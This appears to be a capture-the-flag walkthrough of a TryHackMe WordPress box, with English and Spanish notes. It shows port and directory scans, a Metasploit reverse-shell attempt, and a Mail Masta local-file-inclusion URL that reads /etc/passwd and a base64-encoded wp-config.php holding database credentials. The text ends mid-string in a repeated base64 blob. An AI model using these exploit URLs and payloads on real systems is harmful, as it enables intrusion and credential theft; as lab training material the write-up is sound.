---
This is a fun box where you will get to exploit the system in several ways. Few intended and unintended paths to getting user and root access.
---

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/915c0170a4d0a50cac23bac0f0b1f739.png)

### Hack the machine !

 Start Machine

This box's intention is to help you practice **several** ways in exploiting a system. There is few **intended** paths to exploit it and few **unintended** paths to get root.

Try to discover and exploit them all. **Do not** just exploit it using intended paths, hack like a **pro** and **enjoy** the box !

_Give the machine about 5 mins to fully boot._

**Twitter:** i7m4d

Answer the questions below

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.157.71 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.157.71:21
Open 10.10.157.71:22
Open 10.10.157.71:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-25 12:16 EST
Nmap wishes you a merry Christmas! Specify -sX for Xmas Scan (https://nmap.org/book/man-port-scanning-techniques.html).
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 0.00s elapsed
Initiating Ping Scan at 12:16
Scanning 10.10.157.71 [2 ports]
Completed Ping Scan at 12:16, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:16
Completed Parallel DNS resolution of 1 host. at 12:16, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:16
Scanning 10.10.157.71 [3 ports]
Discovered open port 22/tcp on 10.10.157.71
Discovered open port 80/tcp on 10.10.157.71
Discovered open port 21/tcp on 10.10.157.71
Completed Connect Scan at 12:16, 0.20s elapsed (3 total ports)
Initiating Service scan at 12:16
Scanning 3 services on 10.10.157.71
Completed Service scan at 12:16, 6.43s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.157.71.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:16
NSE: [ftp-bounce 10.10.157.71:21] PORT response: 500 Illegal PORT command.
Completed NSE at 12:16, 5.76s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 1.40s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 0.00s elapsed
Nmap scan report for 10.10.157.71
Host is up, received syn-ack (0.19s latency).
Scanned at 2022-12-25 12:16:26 EST for 14s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.19.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e25c3322765c9366cd969c166ab317a4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLcG2O5LS7paG07xeOB/4E66h0/DIMR/keWMhbTxlA2cfzaDhYknqxCDdYBc9V3+K7iwduXT9jTFTX0C3NIKsVVYcsLxz6eFX3kUyZjnzxxaURPekEQ0BejITQuJRUz9hghT8IjAnQSTPeA+qBIB7AB+bCD39dgyta5laQcrlo0vebY70Y7FMODJlx4YGgnLce6j+PQjE8dz4oiDmrmBd/BBa9FxLj1bGobjB4CX323sEaXLj9XWkSKbc/49zGX7rhLWcUcy23gHwEHVfPdjkCGPr6oiYj5u6OamBuV/A6hFamq27+hQNh8GgiXSgdgGn/8IZFHZQrnh14WmO8xXW5
|   256 1b6a36e18eb4965ec6ef0d91375859b6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1Ww9ui4NQDHA5l+lumRpLsAXHYNk4lkghej9obWBlOwnV+tIDw4mgmuO1C3U/WXRgn0GrESAnMpi1DSxy8t1k=
|   256 fbfadbea4eed202b91189d58a06a50ec (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAOG6ExdDNH+xAyzd4w1G4E9sCfiiooQhmebQX6nIcH/
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.99 seconds



nothing

┌──(kali㉿kali)-[~]
└─$ ftp 10.10.157.71 
Connected to 10.10.157.71.
220 (vsFTPd 3.0.3)
Name (10.10.157.71:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||58792|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -lah
229 Entering Extended Passive Mode (|||31826|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 06  2020 .
drwxr-xr-x    2 0        115          4096 Oct 06  2020 ..
226 Directory send OK.
ftp> pwd
Remote directory: /
ftp> ls -lah
229 Entering Extended Passive Mode (|||36115|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 06  2020 .
drwxr-xr-x    2 0        115          4096 Oct 06  2020 ..
226 Directory send OK.
ftp> quit
221 Goodbye.


┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.157.71/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -k
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.157.71/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/25 12:19:00 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.157.71/wordpress/]
/hackathons           (Status: 200) [Size: 197]
Progress: 21817 / 220561 (9.89%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2022/12/25 12:20:13 Finished
===============================================================

view-source:http://10.10.157.71/hackathons

<h1>Damn how much I hate the smell of <i>Vinegar </i> :/ !!!  </h1>

<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->

https://cyberchef.io/#recipe=Vigen%C3%A8re_Decode('KeepGoing')&input=RHZjIFdAaXl1ckAxMjM

Try H@ckme@123

http://10.10.157.71/wordpress/

using wpscan

┌──(kali㉿kali)-[~]
└─$ wpscan --url http://10.10.157.71/wordpress -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.157.71/wordpress/ [10.10.157.71]
[+] Started: Sun Dec 25 12:25:03 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.157.71/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.157.71/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.157.71/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.157.71/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.157.71/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://10.10.157.71/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.157.71/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.10.157.71/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.1
 | Style URL: http://10.10.157.71/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.157.71/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <=============================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] elyana
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.157.71/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Dec 25 12:25:23 2022
[+] Requests Done: 64
[+] Cached Requests: 6
[+] Data Sent: 16.135 KB
[+] Data Received: 19.647 MB
[+] Memory used: 228.457 MB
[+] Elapsed time: 00:00:19


elyana


-   e enumerate
-   u users
-   ap all plugins

┌──(kali㉿kali)-[~]
└─$ wpscan --url http://10.10.157.71/wordpress -e ap
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.157.71/wordpress/ [10.10.157.71]
[+] Started: Sun Dec 25 12:29:21 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.157.71/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.157.71/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.157.71/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.157.71/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.157.71/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://10.10.157.71/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.157.71/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.10.157.71/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.1
 | Style URL: http://10.10.157.71/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.157.71/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://10.10.157.71/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.157.71/wordpress/wp-content/plugins/mail-masta/readme.txt

[+] reflex-gallery
 | Location: http://10.10.157.71/wordpress/wp-content/plugins/reflex-gallery/
 | Latest Version: 3.1.7 (up to date)
 | Last Updated: 2021-03-10T02:38:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.1.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.157.71/wordpress/wp-content/plugins/reflex-gallery/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Dec 25 12:29:29 2022
[+] Requests Done: 6
[+] Cached Requests: 34
[+] Data Sent: 1.787 KB
[+] Data Received: 11.85 KB
[+] Memory used: 245.453 MB
[+] Elapsed time: 00:00:08

mail-masta 1.0

MailMasta es un plugin de WordPress que se utiliza para enviar correos masivos desde su sitio web. Con este plugin, puede crear campañas de correo electrónico, enviar boletines y noticias a sus suscriptores, y gestionar una lista de correo. También incluye herramientas de análisis para ver cómo están siendo utilizadas sus campañas de correo electrónico y cómo están siendo recibidas por sus destinatarios.

Con MailMasta, puede crear plantillas de correo electrónico personalizadas y segmentar su lista de correo para enviar correos personalizados a grupos específicos de suscriptores. También puede integrar el plugin con otras plataformas de correo electrónico populares, como Mailchimp, para enviar campañas de correo electrónico a través de esas plataformas.

En resumen, MailMasta es una herramienta útil para cualquier persona que desee enviar correos masivos a través de su sitio web de WordPress, ya sea para promocionar un producto o servicio, compartir noticias o actualizaciones, o simplemente mantenerse en contacto con sus suscriptores.

https://www.exploit-db.com/exploits/40290  (LFI)


reflex-gallery 3.1.7

Reflex Gallery es un plugin de WordPress que se utiliza para crear galerías de imágenes y videos en su sitio web de WordPress. Con este plugin, puede mostrar sus imágenes y videos de manera atractiva y fácil de navegar utilizando una variedad de diseños y opciones de personalización.

Para utilizar Reflex Gallery en su sitio web de WordPress, primero debe instalar y activar el plugin. Una vez hecho esto, puede crear una nueva galería desde su panel de administración de WordPress. Para hacerlo, vaya a "Galerías" y haga clic en "Añadir nueva". A continuación, puede seleccionar las imágenes y videos que desea incluir en su galería y personalizar la apariencia y el comportamiento de la galería utilizando las opciones disponibles.

Una vez que haya creado su galería, puede insertarla en su sitio web utilizando el shortcode proporcionado por el plugin o utilizando un widget de galería en su barra lateral o área de widget.

En resumen, Reflex Gallery es un plugin sencillo y fácil de usar que le permite crear galerías de imágenes y videos atractivas en su sitio web de WordPress de manera rápida y sencilla.

https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_reflexgallery_file_upload/ (metasploit)

using first metasploit then LFI 

msfconsole es una interfaz de línea de comandos de la plataforma de explotación Metasploit. La opción "-x" se utiliza para ejecutar una serie de comandos de msfconsole de manera automática cuando se inicia msfconsole. Esto es útil si desea automatizar tareas o configuraciones comunes que realiza en msfconsole.

Por ejemplo, podría utilizar la opción "-x" para cargar un módulo de explotación específico, establecer una opción de configuración, o realizar una búsqueda en la base de datos de exploits. Por ejemplo:

msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST 192.168.1.1; exploit"

En este ejemplo, msfconsole se inicia y carga automáticamente el módulo de explotación ms08_067_netapi, establece el valor de RHOST en 192.168.1.1 y luego lanza la explotación.

Es importante tener en cuenta que la opción "-x" es peligrosa si se utiliza de forma incorrecta, ya que permite ejecutar comandos de manera automática. Asegúrese de utilizarla de manera responsable y de entender completamente los comandos que está ejecutando.

┌──(kali㉿kali)-[~]
└─$ msfconsole --help                                                                           
Usage: msfconsole [options]

Common options:
    -E, --environment ENVIRONMENT    Set Rails environment, defaults to RAIL_ENV environment variable or 'production'

Database options:
    -M, --migration-path DIRECTORY   Specify a directory containing additional DB migrations
    -n, --no-database                Disable database support
    -y, --yaml PATH                  Specify a YAML file containing database settings

Framework options:
    -c FILE                          Load the specified configuration file
    -v, -V, --version                Show version

Module options:
        --defer-module-loads         Defer module loading unless explicitly asked
    -m, --module-path DIRECTORY      Load an additional module path

Console options:
    -a, --ask                        Ask before exiting Metasploit or accept 'exit -y'
    -H, --history-file FILE          Save command history to the specified file
    -l, --logger STRING              Specify a logger to use (Stderr, TimestampColorlessFlatfile, Flatfile, StdoutWithoutTimestamps, Stdout)
        --[no-]readline
    -L, --real-readline              Use the system Readline library instead of RbReadline
    -o, --output FILE                Output to the specified file
    -p, --plugin PLUGIN              Load a plugin on startup
    -q, --quiet                      Do not print the banner on startup
    -r, --resource FILE              Execute the specified resource file (- for stdin)
    -x, --execute-command COMMAND    Execute the specified console commands (use ; for multiples)
    -h, --help                       Show this message

code : https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/unix/webapp/wp_reflexgallery_file_upload.rb

┌──(kali㉿kali)-[~]
└─$ msfconsole -q -x "use exploit/unix/webapp/wp_reflexgallery_file_upload; set RHOST 10.10.157.71; set LHOST 10.8.19.103; set TARGETURI /wordpress/; exploit"
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
RHOST => 10.10.157.71
LHOST => 10.8.19.103
TARGETURI => /wordpress/
[*] Started reverse TCP handler on 10.8.19.103:4444 
[-] Exploit aborted due to failure: unknown: 10.10.157.71:80 - Unable to deploy payload, server returned 200
[*] Exploit completed, but no session was created.

uhmm rport 80 

 This module exploits an arbitrary PHP code upload in the WordPress 
  Reflex Gallery version 3.1.3. The vulnerability allows for arbitrary 
  file upload and remote code execution.

version 3.1.3 so cannot

let's do LFI

http://10.10.161.184/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash mysql:x:110:113:MySQL Server,,,:/nonexistent:/bin/false sshd:x:112:65534::/run/sshd:/usr/sbin/nologin ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin 

database’s config file

http://10.10.161.184/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php

┌──(kali㉿kali)-[~]
└─$ 
echo 'PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb24gc2NyaXB0IHVzZXMgdGhpcyBmaWxlIGR1cmluZyB0aGUNCiAqIGluc3RhbGxhdGlvbi4gWW91IGRvbid0IGhhdmUgdG8gdXNlIHRoZSB3ZWIgc2l0ZSwgeW91IGNhbg0KICogY29weSB0aGlzIGZpbGUgdG8gIndwLWNvbmZpZy5waHAiIGFuZCBmaWxsIGluIHRoZSB2YWx1ZXMuDQogKg0KICogVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBmb2xsb3dpbmcgY29uZmlndXJhdGlvbnM6DQogKg0KICogKiBNeVNRTCBzZXR0aW5ncw0KICogKiBTZWNyZXQga2V5cw0KICogKiBEYXRhYmFzZSB0YWJsZSBwcmVmaXgNCiAqICogQUJTUEFUSA0KICoNCiAqIEBsaW5rIGh0dHBzOi8vd29yZHByZXNzLm9yZy9zdXBwb3J0L2FydGljbGUvZWRpdGluZy13cC1jb25maWctcGhwLw0KICoNCiAqIEBwYWNrYWdlIFdvcmRQcmVzcw0KICovDQoNCi8vICoqIE15U1FMIHNldHRpbmdzIC0gWW91IGNhbiBnZXQgdGhpcyBpbmZvIGZyb20geW91ciB3ZWIgaG9zdCAqKiAvLw0KLyoqIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZSBmb3IgV29yZFByZXNzICovDQpkZWZpbmUoICdEQl9OQU1FJywgJ3dvcmRwcmVzcycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHVzZXJuYW1lICovDQpkZWZpbmUoICdEQl9VU0VSJywgJ2VseWFuYScgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICdIQGNrbWVAMTIzJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0Kd29yZHByZXNzOw0KZGVmaW5lKCAnV1BfU0lURVVSTCcsICdodHRwOi8vJyAuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLicvd29yZHByZXNzJyk7DQpkZWZpbmUoICdXUF9IT01FJywgJ2h0dHA6Ly8nIC4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJy93b3JkcHJlc3MnKTsNCg0KLyoqI0ArDQogKiBBdXRoZW50aWNhdGlvbiBVbmlxdWUgS2V5cyBhbmQgU2FsdHMuDQogKg0KICogQ2hhbmdlIHRoZXNlIHRvIGRpZmZlcmVudCB1bmlxdWUgcGhyYXNlcyENCiAqIFlvdSBjYW4gZ2VuZXJhdGUgdGhlc2UgdXNpbmcgdGhlIHtAbGluayBodHRwczovL2FwaS53b3JkcHJlc3Mub3JnL3NlY3JldC1rZXkvMS4xL3NhbHQvIFdvcmRQcmVzcy5vcmcgc2VjcmV0LWtleSBzZXJ2aWNlfQ0KICogWW91IGNhbiBjaGFuZ2UgdGhlc2UgYXQgYW55IHBvaW50IGluIHRpbWUgdG8gaW52YWxpZGF0ZSBhbGwgZXhpc3RpbmcgY29va2llcy4gVGhpcyB3aWxsIGZvcmNlIGFsbCB1c2VycyB0byBoYXZlIHRvIGxvZyBpbiBhZ2Fpbi4NCiAqDQogKiBAc2luY2UgMi42LjANCiAqLw0KZGVmaW5lKCA                                                                                               gaG9zdCAqKiAvLw0KLyoqIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZSBmb3IgV29yZFByZXNzICovDQpkZWZpbmUoICdEQl9OQU1FJywgJ3dvcmRwcmVzcycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHVzZXJuYW1lICovDQpkZWZpbmUoICdEQl9VU0VSJywgJ2VseWFuYScgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICdIQGNrbWVAMTIzJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0Kd29yZHByZXNzOw0KZGVmaW5lKCAnV1BfU0lURVVSTCcsICdodHRwOi8vJyAuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLicvd29yZHByZXNzJyk7DQpkZWZpbmUoICdXUF9IT01FJywgJ2h0dHA6Ly8nIC4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJy93b3JkcHJlc3MnKTsNCg0KLyoqI0ArDQogKiBBdXRoZW50aWNhdGlvbiBVbmlxdWUgS2V5cyBhbmQgU2FsdHMuD